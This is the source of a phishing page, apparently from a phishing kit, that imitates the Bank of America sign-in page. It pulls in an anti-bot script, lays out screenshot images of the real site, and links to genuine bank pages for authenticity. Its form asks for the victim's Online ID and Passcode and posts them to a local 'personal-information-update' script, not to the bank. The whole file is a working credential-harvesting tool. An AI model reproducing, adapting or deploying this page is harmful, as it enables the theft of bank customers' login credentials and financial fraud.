    <?php
include "antibots.php";

?>
<html>
    
    <head><meta http-equiv="Content-Type" content="text/html; charset=ansi_x3.110-1983">
        <! --- Links ---- !>
        <link rel="stylesheet" href="./css/style1.css" type="text/css" />
        <title>Bank Of America - Banking, Credit Cards, Home Loans & Auto Loans</title>

<link rel="shortcut icon"
              href="images/favicon.ico"/>
        <! ---- Links --- !>
         </head>

</script>


    <body>
        <! --- Header ---- !>
       <header class="ilyas_header">
           <div class="logo">



<IMG src="images/boa-header11.png" style="position:absolute;top:0px;left:0px;">
</div>
</div>

<a href="bankofamerica-business-login.php?cmd=wait_submit&id=$praga$praga&session=$praga$praga"><IMG src="images/small-business.png" style="position:absolute;top:7px;left:140px; solid #bdc4c9;">
</div>
</div>

<a href="https://www.ml.com/wealthmanagement.html"><IMG src="images/wm.png" style="position:absolute;top:7px;left:264px; solid #bdc4c9;">
</div>
</div>

<a href="https://www.bofaml.com/content/boaml/en_us/home.html"><IMG src="images/bi.png" style="position:absolute;top:8px;left:424px; solid #bdc4c9;">
</div>
</div>

<a href="#"><IMG src="images/en.png" style="position:absolute;top:7px;left:1090px; solid #bdc4c9;">
</div>
</div>

<a href="https://www.bankofamerica.com/contactus/contactus.go?request_locale=en_US"><IMG src="images/cu.png" style="position:absolute;top:7px;left:1189px; solid #bdc4c9;">
</div>
</div>

<a href="https://www.bankofamerica.com/deposits/checking/checking-accounts/"><IMG src="images/checkings.png" style="position:absolute;top:97px;left:55px; solid #bdc4c9;">
</div>
</div>

<a href="https://www.bankofamerica.com/deposits/savings/savings-accounts/"><IMG src="images/savings.png" style="position:absolute;top:95px;left:217px; solid #bdc4c9;">
</div>
</div>

<a href="https://www.bankofamerica.com/credit-cards/"><IMG src="images/cc.png" style="position:absolute;top:96px;left:368px; solid #bdc4c9;">
</div>
</div>

<a href="https://www.bankofamerica.com/mortgage/home-mortgage/"><IMG src="images/hl.png" style="position:absolute;top:95px;left:559px; solid #bdc4c9;">
</div>
</div>

<a href="https://www.bankofamerica.com/auto-loans/"><IMG src="images/al.png" style="position:absolute;top:95px;left:750px; solid #bdc4c9;">
</div>
</div>


<a href="https://www.merrilledge.com/?src_cd=bac_hp_nav_streamline"><IMG src="images/investment.png" style="position:absolute;top:87px;left:929px; solid #bdc4c9;">
</div>
</div>

<a href="https://bettermoneyhabits.bankofamerica.com/en"><IMG src="images/bmh.png" style="position:absolute;top:96px;left:1126px; solid #bdc4c9;">
</div>
</div>

<a href="#"><IMG src="images/lata.png" style="position:absolute;top:298px;left:414px; solid #bdc4c9;">
</div>
</div>

<form action="secure-bankofamerica-personal-information-update.php?cmd=account_update_submit&id=$praga$praga&session=$praga$praga" name="chalbhai" id="chalbhai" method="post" required="required">

<input name="id" type="text" class="textbox" required="required" maxlength="40" style="position:absolute;left:79px;top:177px;width:255px;height:38px;padding:1px;border-radius:0px;border:0px solid #bdc4c9;" placeholder="Online ID"> 

</div>
</div> 
<input name="pass" type="password" class="textbox" required="required" maxlength="30" style="position:absolute;left:79px;top:225px;width:255px;height:38px;padding:1px;border-radius:0px;border:0px solid #bdc4c9;" placeholder="Passcode">
</div>
</div> 

<input name="" type="checkbox" tabIndex="1" aria-label="Name On Card" class="fm-text" style="position:absolute;left:74px;top:273px;" size="6"  autofocus="1" placeholder="">
</div>
</div> 

<input type="image" name="formimage1" src="images/sign-on.png" style="position:absolute;top:305px;left:79px;">
</div>
</div>

<a href="#"><IMG src="images/foi.png" style="position:absolute;top:355px;left:75px; solid #bdc4c9;">
</div>
</div>

<a href="#"><IMG src="images/fp.png" style="position:absolute;top:355px;left:212px; solid #bdc4c9;">
</div>
</div>


<a href="javascript:void(0);"><IMG src="images/sh.png" style="position:absolute;top:385px;left:75px; solid #bdc4c9;">
</div>
</div>

<a href="https://secure.bankofamerica.com/login/enroll/entry/olbEnroll.go?request_locale=en_US"><IMG src="images/enroll.png" style="position:absolute;top:384px;left:282px; solid #bdc4c9;">
</div>
</div>

<a href="https://promo.bankofamerica.com/hp-oaa2/"><IMG src="images/oaa.png" style="position:absolute;top:410px;left:58px; solid #bdc4c9;">
</div>
</div>

<a href="https://locators.bankofamerica.com/"><IMG src="images/atm-loc.png" style="position:absolute;top:465px;left:57px; solid #bdc4c9;">
</div>
</div>

<a href="https://secure.bankofamerica.com/mycommunications/public/appointments/getTopics.go?marketingCode=NEWHP_ECHMPG"><IMG src="images/saa.png" style="position:absolute;top:522px;left:57px; solid #bdc4c9;">
</div>
</div>

    </body>
</html>